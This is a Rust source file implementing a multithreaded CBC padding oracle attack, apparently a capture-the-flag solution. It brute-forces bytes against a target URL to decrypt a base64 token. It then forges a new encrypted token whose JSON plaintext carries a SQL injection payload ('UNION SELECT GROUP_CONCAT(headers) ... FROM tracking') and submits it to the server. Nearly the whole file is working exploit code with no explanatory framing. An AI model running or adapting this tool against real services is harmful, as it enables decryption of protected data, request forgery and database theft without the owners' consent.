mod decrypt;
use anyhow::{Result, *};
use base64::{prelude::BASE64_STANDARD, Engine};
use clap::Parser;
use reqwest::{blocking::Client, Url};
use std::{
    io::{self, Write},
    sync::{atomic::AtomicU16, Arc, Condvar, Mutex},
    thread::sleep,
    time::Duration,
};

#[derive(Debug, Parser)]
#[command(version, about, long_about = None)]
struct Args {
    url: Url,
    #[arg(long = "ciphertext")]
    base64: String,
    #[arg(short, long)]
    iv: Option<String>,
    #[arg(short, long)]
    new: bool,
}

pub struct Semaphore {
    counter: Mutex<usize>,
    condvar: Condvar,
    limit: usize,
}

pub struct SemaphoreGuard<'a> {
    semaphore: &'a Semaphore,
}

impl Semaphore {
    pub fn start(&self) -> SemaphoreGuard<'_> {
        // wait for availability
        let mut count = self.counter.lock().unwrap();
        while *count >= self.limit {
            count = self.condvar.wait(count).unwrap();
        }

        *count += 1;
        SemaphoreGuard { semaphore: self }
    }

    fn decrement(&self) {
        *self.counter.lock().unwrap() -= 1;
        self.condvar.notify_all();
    }

    pub fn new(limit: usize) -> Self {
        Self {
            counter: Mutex::new(0),
            condvar: Condvar::new(),
            limit,
        }
    }
}

impl Drop for SemaphoreGuard<'_> {
    fn drop(&mut self) {
        self.semaphore.decrement()
    }
}

fn main() -> Result<()> {
    let args = Args::parse();

    println!("{args:#?}");

    if args.new {
        output_new_package(&args);
        return Ok(());
    }

    let client = Client::new();
    let mut chunks: Vec<Vec<u8>> = BASE64_STANDARD
        .decode(
            args.base64
                .replace('~', "=")
                .replace('!', "/")
                .replace('-', "+"),
        )?
        .chunks(16)
        .map(|chunk| chunk.to_vec())
        .collect();

    chunks
        .iter()
        .flatten()
        .for_each(|chunk| print!("{chunk:x?} "));
    let orig_chunks = chunks.clone();
    let len = chunks.len();
    let mut plaintext: Vec<Vec<u8>> = vec![];
    let url = &args.url;

    let finished = Arc::new((Mutex::new(None::<u8>), Condvar::new()));
    let generation = Mutex::new(1u8);
    std::thread::scope(|scope| -> Result<()> {
        for chunk in 2..=10 {
            let mut intermediates = [0u8; 16];
            chunks = orig_chunks.clone();
            for i in 1u8..=16 {
                *(generation.lock().unwrap()) = i;
                println!("chunk: #{}", len - chunk);
                println!("i: {i}");
                let mut handles = vec![];
                let semaphore = Arc::new(Semaphore::new(30));
                for b in 0u8..=255 {
                    let mut chunks = chunks.clone();
                    let client = &client;
                    let semaphore = semaphore.clone();
                    let finished = finished.clone();
                    let generation = &generation;
                    let orig_chunks = &orig_chunks;
                    let handle = scope.spawn(move || {
                        chunks[len - chunk][16 - i as usize] = b;
                        if chunks[len - chunk] == orig_chunks[len - chunk] {
                            return;
                        }
                        // println!(
                        //     "{:x?}",
                        //     chunks
                        //         .clone()
                        //         .into_iter()
                        //         .skip(8)
                        //         .flatten()
                        //         .collect::<Vec<_>>()
                        // );
                        let encoded = BASE64_STANDARD
                            .encode(
                                chunks
                                    .clone()
                                    .into_iter()
                                    .skip(len - chunk)
                                    .take(2)
                                    .flatten()
                                    .collect::<Vec<_>>(),
                            )
                            .replace('=', "~")
                            .replace('/', "!")
                            .replace('+', "-");
                        let guard = semaphore.start();
                        let res = client
                            .get(url.as_str())
                            .query(&[("post", encoded)])
                            .send()
                            .unwrap();
                        drop(guard);
                        if *(generation.lock().unwrap()) != i {
                            return;
                        }
                        let text = res.text().unwrap();
                        if text.contains("PaddingException") {
                            print!("{b} ");
                            io::stdout().flush().unwrap();
                        } else {
                            println!("\n{b} {text}");
                            if text.contains("UnicodeDecodeError")
                                || text.contains("ValueError")
                                || i != 1
                            {
                                let (finished_b, finished_condvar) = &*finished;
                                *(finished_b.lock().unwrap()) = Some(b);
                                finished_condvar.notify_one();
                            }
                        }
                    });

                    handles.push(handle);
                }

                let (finished_b, finished_condvar) = &*finished.clone();
                let mut b_guard = finished_b.lock().unwrap();
                while (*b_guard).is_none() {
                    b_guard = finished_condvar.wait(b_guard).unwrap();
                }
                let b = (*b_guard).take();
                drop(b_guard);
                if let Some(b) = b {
                    // then continue here with the loop
                    intermediates[16 - i as usize] = b ^ i;
                    let second_last = chunks.get_mut(len - chunk).unwrap();
                    println!("{second_last:x?}");
                    for x in 1..=i {
                        second_last[16 - x as usize] = intermediates[16 - x as usize] ^ (i + 1);
                    }
                    println!("{second_last:x?}");
                    continue;
                } else {
                    panic!()
                }
            }

            println!("{:x?}", intermediates);
            let newplaintext: Vec<u8> = intermediates
                .iter()
                .zip(orig_chunks.get(len - chunk).unwrap().iter())
                .map(|(&x1, &x2)| x1 ^ x2)
                .collect();
            plaintext.push(newplaintext);
            println!("{:?}", plaintext);

            if chunk == 10 {
                plaintext.reverse();
                println!("{}", String::from_utf8(plaintext.concat())?);
            }
        }
        Ok(())
    })?;
    // plaintext.reverse();
    // println!("{}", String::from_utf8(plaintext.concat())?);

    Ok(())
}

fn make_package(block3: &[u8], block4: &[u8]) -> String {
    BASE64_STANDARD
        .encode([block3, block4].concat())
        .replace('=', "~")
        .replace('/', "!")
        .replace('+', "-")
}

fn output_new_package(args: &Args) -> Result<()> {
    // set package
    let input = r#"{"id": "NULL UNION SELECT GROUP_CONCAT(headers), NULL FROM tracking", "key": "SKuFkF2C4Hp0Sljv!OOUDA~~"}"#;
    // change to bytes and pad
    let mut bytes = input.as_bytes().to_vec();
    let padding = 16 - (bytes.len() % 16);
    bytes.extend((0..padding).map(|_| padding as u8));
    println!("plaintext {:?}", &bytes);
    println!("blocks {:?}", bytes.len() / 16);

    let mut ciphertext = vec![vec![0u8; 16]];
    let mut client = Arc::new(Client::new());

    for textchunk in bytes.chunks_exact(16).rev() {
        let mut chunks = vec![[0u8; 16].to_vec(), ciphertext.last().unwrap().to_vec()];
        let mut orig_chunks = chunks.clone();
        let len = chunks.len();
        let mut intermediates = [0u8; 16];
        let mut plaintext: Vec<Vec<u8>> = vec![];
        let url = Arc::new(args.url.clone());
        for chunk in 2..=2 {
            let mut intermediates = [0u8; 16];
            chunks = orig_chunks.clone();
            for i in 1u8..=16 {
                println!("chunk: #{}", len - chunk);
                println!("i: {i}");

                let mut handles = vec![];
                let semaphore = Arc::new(Semaphore::new(20));
                for b in 0u8..=255 {
                    let url = url.clone();
                    let mut chunks = chunks.clone();
                    let client = client.clone();
                    let semaphore = semaphore.clone();
                    let handle = std::thread::spawn(move || -> Option<u8> {
                        {
                            let second_last = chunks.get_mut(len - chunk).unwrap();
                            second_last[16 - i as usize] = b;
                        }
                        // println!(
                        //     "{:x?}",
                        //     chunks
                        //         .clone()
                        //         .into_iter()
                        //         .skip(8)
                        //         .flatten()
                        //         .collect::<Vec<_>>()
                        // );
                        let encoded = BASE64_STANDARD
                            .encode(
                                chunks
                                    .clone()
                                    .into_iter()
                                    .skip(len - chunk)
                                    .take(2)
                                    .flatten()
                                    .collect::<Vec<_>>(),
                            )
                            .replace('=', "~")
                            .replace('/', "!")
                            .replace('+', "-");
                        // loop {
                        //     {
                        //         let mut lock = atomic.lock().ok()?;
                        //         if *lock > 0 {
                        //             *lock -= 1;
                        //             break;
                        //         }
                        //     }
                        //     sleep(Duration::from_millis(100));
                        // }
                        let guard = semaphore.start();
                        //sleep(Duration::from_millis(100));
                        let res = client
                            .get(url.as_str())
                            .query(&[("post", encoded)])
                            .send()
                            .ok()?;
                        drop(guard);
                        // {
                        //     let mut lock = atomic.lock().ok()?;
                        //     *lock += 1;
                        // }
                        let text = res.text().ok()?;
                        if text.contains("PaddingException") {
                            print!("{b} ");
                            io::stdout().flush().unwrap();
                        } else {
                            println!("\n{b} {text}");
                            if text.contains("UnicodeDecodeError")
                                || text.contains("ValueError")
                                || i != 1
                            {
                                // println!("hit a Some!");
                                return Some(b);
                            }
                        }
                        //println!("hit a None!");
                        None
                    });
                    handles.push(handle);
                }

                let mut b: Option<u8> = None;
                for handle in handles {
                    if let Some(x) = handle.join().unwrap() {
                        b = Some(x);
                        break;
                    }
                }
                if let Some(b) = b {
                    // then continue here with the loop
                    intermediates[16 - i as usize] = b ^ i;
                    let second_last = chunks.get_mut(len - chunk).unwrap();
                    println!("{second_last:x?}");
                    for x in 1..=i {
                        second_last[16 - x as usize] = intermediates[16 - x as usize] ^ (i + 1);
                    }
                    println!("{second_last:x?}");
                    continue;
                } else {
                    panic!()
                }
            }

            println!("{:x?}", intermediates);
            let newplaintext: Vec<u8> = intermediates
                .iter()
                .zip(textchunk)
                .map(|(&x1, &x2)| x1 ^ x2)
                .collect();
            ciphertext.push(newplaintext);
        }
    }

    let encoded = BASE64_STANDARD
        .encode(
            ciphertext
                .clone()
                .into_iter()
                .rev()
                .flatten()
                .collect::<Vec<u8>>(),
        )
        .replace('=', "~")
        .replace('/', "!")
        .replace('+', "-");
    let res = client
        .get(args.url.as_str())
        .query(&[("post", encoded)])
        .send()?;
    let text = res.text()?;
    println!("{text}");

    // println!("{}", String::from_utf8(plaintext.concat())?);

    Ok(())
}
